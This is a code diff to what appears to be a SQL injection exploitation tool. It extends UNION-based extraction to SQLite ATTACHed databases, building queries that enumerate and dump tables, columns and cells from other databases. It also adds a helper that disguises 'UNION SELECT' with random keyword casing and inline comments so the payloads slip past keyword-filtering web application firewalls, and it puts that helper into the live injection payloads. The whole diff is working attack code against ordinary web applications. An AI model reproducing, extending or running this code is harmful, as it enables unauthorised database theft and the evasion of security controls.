@@ -530,15 +530,16 @@ SYSTEM_DBS = {
     "mysql":    {"information_schema", "performance_schema", "mysql", "sys"},
     "postgres": {"information_schema", "pg_catalog", "pg_toast"},
     "mssql":    {"master", "tempdb", "model", "msdb"},
-    "sqlite":   set(),
+    "sqlite":   {"temp"},
 }
 
 
 def cross_db_supported(dbms):
-    """Whether a single injection point can read *other* databases' data. MySQL and
-    MSSQL qualify across databases in one query (`db.table`); SQLite (one file) and
+    """Whether a single injection point can read *other* databases' data. MySQL/MSSQL
+    qualify across databases in one query (`db.table`); SQLite reaches every ATTACHed
+    database the connection holds (`archive.table`, listed by pragma_database_list).
     Postgres (one database per connection) can't — only the current one is reachable."""
-    return dbms in ("mysql", "mssql")
+    return dbms in ("mysql", "mssql", "sqlite")
 
 
 def scoped_profile(prof, dbms, db):
@@ -564,6 +565,13 @@ def scoped_profile(prof, dbms, db):
         p["col_at"]   = "(SELECT column_name FROM " + cat + "columns WHERE table_name='{t}' ORDER BY column_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
         p["rows_n"]   = "(SELECT count(*) FROM " + db + ".dbo.{t})"
         p["cell_at"]  = "(SELECT {c} FROM " + db + ".dbo.{t} ORDER BY 1 OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
+    elif dbms == "sqlite":                                  # an ATTACHed database (db.table)
+        p["tables_n"] = "(SELECT count(*) FROM " + db + ".sqlite_master WHERE type='table')"
+        p["table_at"] = "(SELECT name FROM " + db + ".sqlite_master WHERE type='table' LIMIT 1 OFFSET {k})"
+        p["cols_n"]   = "(SELECT count(*) FROM pragma_table_info('{t}','" + db + "'))"
+        p["col_at"]   = "(SELECT name FROM pragma_table_info('{t}','" + db + "') LIMIT 1 OFFSET {k})"
+        p["rows_n"]   = "(SELECT count(*) FROM " + db + ".{t})"
+        p["cell_at"]  = "(SELECT {c} FROM " + db + ".{t} LIMIT 1 OFFSET {k})"
     return p
 
 
@@ -575,6 +583,8 @@ def _qualify(dbms, db, table):
         return "`" + db + "`." + table
     if dbms == "mssql":
         return db + ".dbo." + table
+    if dbms == "sqlite":
+        return db + "." + table
     return table
 
 
@@ -586,6 +596,10 @@ def _uscope(dbms, which, db):
         if which == "tables":
             return "table_name FROM information_schema.tables WHERE table_schema='" + db + "'"
         return "column_name FROM information_schema.columns WHERE table_name={t} AND table_schema='" + db + "'"
+    if dbms == "sqlite":                                    # an ATTACHed database
+        if which == "tables":
+            return "name FROM " + db + ".sqlite_master WHERE type='table'"
+        return "name FROM pragma_table_info({t},'" + db + "')"
     # mssql
     if which == "tables":
         return "table_name FROM " + db + ".information_schema.tables"
@@ -683,6 +697,14 @@ def _uagg(dbms, expr, rowsep):
     return f"string_agg(cast({expr} as varchar(4000)),{sep})"   # postgres / mssql
 
 
+def _union_select() -> str:
+    """`UNION SELECT` spelled to slip a naive keyword WAF: randomised keyword case (beats
+    a case-sensitive filter) with an inline comment for the gap (beats one matching across
+    whitespace). Valid SQL on every engine; the quote-free literals carry the data."""
+    mix = lambda w: "".join(c.upper() if random.getrandbits(1) else c.lower() for c in w)
+    return f"{mix('UNION')}/**/{mix('SELECT')}"
+
+
 def union_setup(http, oracle, dbms, maxcols=15):
     """Find the column count (ORDER BY) and a reflected column, or None.
 
@@ -718,7 +740,7 @@ def union_setup(http, oracle, dbms, maxcols=15):
         cols = ["NULL"] * ncols
         cols[refcol] = _strlit(dbms, mark)
         r = _html.unescape(_inject(http, oracle.url, oracle.param,
-                                   f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"))
+                                   f"{oracle.value}{q} AND 1=2 {_union_select()} {','.join(cols)}{_COMMENT}"))
         if mark in r:
             return ncols, refcol
     return None
@@ -736,7 +758,7 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
     cols = ["NULL"] * ncols
     cols[refcol] = _ucat(dbms, [mark, inner, mark])
     q = _quote_for(oracle.context)
-    payload = f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"
+    payload = f"{oracle.value}{q} AND 1=2 {_union_select()} {','.join(cols)}{_COMMENT}"
     body = _html.unescape(_inject(http, oracle.url, oracle.param, payload))
     m = re.search(re.escape(umark) + "(.*?)" + re.escape(umark), body, re.S)
     return m.group(1) if m else ""
